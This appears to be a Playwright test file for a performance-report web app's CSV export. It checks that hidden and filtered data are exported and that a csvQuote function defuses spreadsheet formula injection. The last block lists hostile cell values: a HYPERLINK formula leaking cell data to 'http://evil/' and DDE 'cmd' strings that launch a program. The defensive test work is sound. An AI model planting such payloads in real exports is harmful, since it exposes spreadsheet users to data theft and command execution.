import { test, expect } from '@playwright/test';
import { loadClean, switchTab } from './helpers';
import * as fs from 'fs';
import * as path from 'path';

/**
 * CSV Export Tests
 * Verifies that CSV downloads contain ALL data — hidden rows, hidden columns,
 * filtered samplers all included in the export.
 *
 * Uses Playwright's download event to capture the CSV file content.
 */

/** Click a CSV button and return the downloaded file content as string */
async function downloadCsv(page: any, buttonLocator: any): Promise<string> {
  const [download] = await Promise.all([
    page.waitForEvent('download'),
    buttonLocator.click(),
  ]);
  const filePath = await download.path();
  const content = fs.readFileSync(filePath!, 'utf-8');
  return content;
}

/** Parse CSV content into rows of cells (handles BOM) */
function parseCsv(content: string): string[][] {
  // Remove BOM if present
  const clean = content.replace(/^\uFEFF/, '');
  return clean.trim().split('\n').map(line =>
    line.split(',').map(cell => cell.replace(/^"|"$/g, '').trim())
  );
}

test.describe('CSV Export — Sampler Statistics Table', () => {
  test('[R] CSV download button exists on Samplers tab', async ({ page }) => {
    await loadClean(page, 'E02');
    await switchTab(page, 'samplers');
    const csvBtn = page.locator('#tab-samplers .table-csv-btn').first();
    await expect(csvBtn).toBeVisible();
  });

  test('[C/R] Download CSV and verify header row has all 14 columns', async ({ page }) => {
    await loadClean(page, 'E02');
    await switchTab(page, 'samplers');
    const csvBtn = page.locator('#tab-samplers .table-csv-btn').first();
    const content = await downloadCsv(page, csvBtn);
    const rows = parseCsv(content);
    const header = rows[0];

    // Should have all columns regardless of visibility
    expect(header.length).toBeGreaterThanOrEqual(13); // At least Sampler through Recv KB/s
    expect(header.some(h => h.includes('Sampler'))).toBe(true);
    expect(header.some(h => h.includes('Samples'))).toBe(true);
    expect(header.some(h => h.includes('P95'))).toBe(true);
    expect(header.some(h => h.includes('Throughput'))).toBe(true);
  });

  test('[C/R] CSV has data rows for ALL samplers (not just visible)', async ({ page }) => {
    await loadClean(page, 'E02');
    await switchTab(page, 'samplers');

    // Count total sampler rows in table (visible)
    const visibleRows = await page.locator('#tab-samplers table tbody tr').count();

    const csvBtn = page.locator('#tab-samplers .table-csv-btn').first();
    const content = await downloadCsv(page, csvBtn);
    const rows = parseCsv(content);
    const dataRows = rows.slice(1); // skip header

    // CSV should have at least as many rows as visible (usually more with hidden/Total)
    expect(dataRows.length).toBeGreaterThanOrEqual(1);
  });

  test('[C/R] CSV includes data even after hiding columns via JS', async ({ page }) => {
    await loadClean(page, 'E02');
    await switchTab(page, 'samplers');

    // Hide Min column programmatically (simulate what Columns dropdown does)
    await page.evaluate(() => {
      if (typeof applyColumnVisibility === 'function' && typeof hiddenColumns !== 'undefined') {
        // @ts-ignore
        hiddenColumns['Min (ms)'] = true;
        // @ts-ignore
        applyColumnVisibility();
      }
    });
    await page.waitForTimeout(200);

    // Verify Min column is visually hidden in table
    const minVisible = await page.evaluate(() => {
      const headers = document.querySelectorAll('#tab-samplers table thead th');
      return Array.from(headers).some(th => th.textContent?.includes('Min') && (th as HTMLElement).style.display !== 'none');
    });
    // Min should be hidden now (or the evaluate didn't work — either way test the CSV)

    // Download CSV — Min column should STILL be in the export
    const csvBtn = page.locator('#tab-samplers .table-csv-btn').first();
    const content = await downloadCsv(page, csvBtn);
    const rows = parseCsv(content);
    const header = rows[0];
    expect(header.some(h => h.includes('Min'))).toBe(true);
  });

  test('[C/R] CSV includes data even after hiding rows', async ({ page }) => {
    await loadClean(page, 'E02');
    await switchTab(page, 'samplers');

    // Count rows before hiding
    const csvBtnBefore = page.locator('#tab-samplers .table-csv-btn').first();
    const contentBefore = await downloadCsv(page, csvBtnBefore);
    const rowsBefore = parseCsv(contentBefore).slice(1).length;

    // Hide first data row via X button
    const hideBtn = page.locator('#tab-samplers table tbody tr .hide-row-btn, #tab-samplers table tbody tr button[title*="Hide"]').first();
    if (await hideBtn.count() > 0) {
      await hideBtn.click();
      await page.waitForTimeout(200);
    }

    // Download CSV again — hidden row should STILL be in export
    const contentAfter = await downloadCsv(page, csvBtnBefore);
    const rowsAfter = parseCsv(contentAfter).slice(1).length;
    expect(rowsAfter).toBe(rowsBefore); // Same count — hidden row included
  });

  test('[C/R] CSV includes data even after deselecting sampler in filter', async ({ page }) => {
    await loadClean(page, 'E02');
    await switchTab(page, 'samplers');

    // Download CSV before filtering
    const csvBtn = page.locator('#tab-samplers .table-csv-btn').first();
    const contentBefore = await downloadCsv(page, csvBtn);
    const rowsBefore = parseCsv(contentBefore).slice(1).length;

    // Deselect first sampler
    const labels = page.locator('#samplerFilterList label');
    if (await labels.count() > 0) {
      await labels.first().click();
      await page.waitForTimeout(300);
    }

    // Download CSV — deselected sampler should STILL be in export
    const contentAfter = await downloadCsv(page, csvBtn);
    const rowsAfter = parseCsv(contentAfter).slice(1).length;
    expect(rowsAfter).toBe(rowsBefore);

    // Re-check sampler
    if (await labels.count() > 0) {
      await labels.first().click();
    }
  });

  test('[R] CSV data values are non-empty (not all zeros)', async ({ page }) => {
    await loadClean(page, 'E02');
    await switchTab(page, 'samplers');
    const csvBtn = page.locator('#tab-samplers .table-csv-btn').first();
    const content = await downloadCsv(page, csvBtn);
    const rows = parseCsv(content);
    // Check first data row has non-zero Samples value (column index 1)
    const samplesIdx = rows[0].findIndex(h => h.includes('Samples'));
    if (samplesIdx >= 0 && rows.length > 1) {
      const value = parseInt(rows[1][samplesIdx]);
      expect(value).toBeGreaterThan(0);
    }
  });
});

test.describe('CSV Export — Top 5 Slowest', () => {
  test('[C/R] Top 5 CSV has rank, name, p95, mean columns', async ({ page }) => {
    await loadClean(page, 'E02');
    const csvBtn = page.locator('#tab-summary .table-csv-btn').first();
    if (await csvBtn.count() === 0) return; // No Top 5 section
    const content = await downloadCsv(page, csvBtn);
    const rows = parseCsv(content);
    expect(rows.length).toBeGreaterThanOrEqual(2); // header + at least 1 row
    const header = rows[0].map(h => h.toLowerCase());
    expect(header.some(h => h.includes('sampler') || h.includes('name'))).toBe(true);
  });
});

test.describe('CSV Export — Error Summary', () => {
  test('[C/R] Error Summary CSV has sampler, code, count columns', async ({ page }) => {
    await loadClean(page, 'E02');
    await switchTab(page, 'errors');
    await page.waitForTimeout(300);
    // Find CSV button near Error Summary table
    const csvBtns = page.locator('#tab-errors .table-csv-btn');
    if (await csvBtns.count() === 0) return;
    const content = await downloadCsv(page, csvBtns.first());
    const rows = parseCsv(content);
    expect(rows.length).toBeGreaterThanOrEqual(2);
  });
});

test.describe('CSV Export — Error Details', () => {
  test('[C/R] Error Details CSV has timestamp, sampler, code, message columns', async ({ page }) => {
    await loadClean(page, 'E02');
    await switchTab(page, 'errors');
    await page.waitForTimeout(300);
    const csvBtns = page.locator('#tab-errors .table-csv-btn');
    if (await csvBtns.count() >= 2) {
      const content = await downloadCsv(page, csvBtns.nth(1));
      const rows = parseCsv(content);
      expect(rows.length).toBeGreaterThanOrEqual(2);
    }
  });
});

test.describe('CSV Export — Comparison Table', () => {
  test('[C/R] Comparison CSV has sampler rows with delta values [CMP]', async ({ page }) => {
    await loadClean(page, 'CMP');
    await switchTab(page, 'compare');
    await page.waitForTimeout(300);
    const csvBtn = page.locator('#tab-compare .table-csv-btn').first();
    if (await csvBtn.count() === 0) return;
    const content = await downloadCsv(page, csvBtn);
    const rows = parseCsv(content);
    expect(rows.length).toBeGreaterThanOrEqual(2);
  });
});

/**
 * CSV formula (DDE) injection — SEC-2 / FE-3 / LIST-2.
 *
 * Sampler labels, response messages, URLs and response bodies reach the CSV
 * exporters from the test plan and from the system under test. Excel strips the
 * text qualifier before evaluating, so quoting alone does not stop a cell whose
 * text begins with = + - @ from executing as a formula.
 */
test.describe('CSV Export — formula injection', () => {
  const HOSTILE = [
    '=HYPERLINK("http://evil/"&A1,"click")',
    '+cmd|\'/c calc\'!A1',
    '-2+3+cmd|\'/c calc\'!A1',
    '@SUM(1+1)*cmd|\'/c calc\'!A1',
    '\tleading tab',
    '\rleading cr',
  ];

  test('[C/R] csvQuote prefixes a quote so hostile cells are inert text', async ({ page }) => {
    await loadClean(page, 'E02');
    const quoted = await page.evaluate(
      (vals) => vals.map((v) => (window as any).csvQuote(v)),
      HOSTILE,
    );
    quoted.forEach((cell, i) => {
      // Strip the CSV text qualifier the way a spreadsheet does, then check the
      // first character can no longer start a formula.
      const inner = cell.replace(/^"|"$/g, '');
      expect(inner.charAt(0), `hostile value #${i} must not start a formula`).toBe("'");
    });
  });

  test('[C/R] csvQuote leaves plain numbers (incl. negative deltas) numeric', async ({ page }) => {
    await loadClean(page, 'E02');
    const quoted = await page.evaluate(
      () => ['-12.34', '0', '42', '1.5e3', '-0.001'].map((v) => (window as any).csvQuote(v)),
    );
    expect(quoted).toEqual(['"-12.34"', '"0"', '"42"', '"1.5e3"', '"-0.001"']);
  });

  test('[C/R] csvQuote still escapes embedded quotes and handles null', async ({ page }) => {
    await loadClean(page, 'E02');
    const out = await page.evaluate(() => {
      const q = (window as any).csvQuote;
      return { quotes: q('say "hi"'), nul: q(null), undef: q(undefined), plain: q('GET /users') };
    });
    expect(out.quotes).toBe('"say ""hi"""');
    expect(out.nul).toBe('""');
    expect(out.undef).toBe('""');
    expect(out.plain).toBe('"GET /users"');
  });

  test('[C/R] a hostile sampler name is neutralized in a real export', async ({ page }) => {
    await loadClean(page, 'E02');
    await switchTab(page, 'samplers');

    // Plant a formula payload as a sampler name, then export.
    await page.evaluate(() => {
      const w = window as any;
      if (w.globalChartData && w.globalChartData.samplers && w.globalChartData.samplers.length) {
        w.globalChartData.samplers[0].name = '=HYPERLINK("http://evil/","x")';
      }
    });

    const csvBtn = page.locator('#tab-samplers .table-csv-btn').first();
    const content = await downloadCsv(page, csvBtn);

    expect(content).toContain('"\'=HYPERLINK');
    // The raw, evaluable form must not appear as a cell start anywhere.
    expect(content).not.toContain('"=HYPERLINK');
  });
});
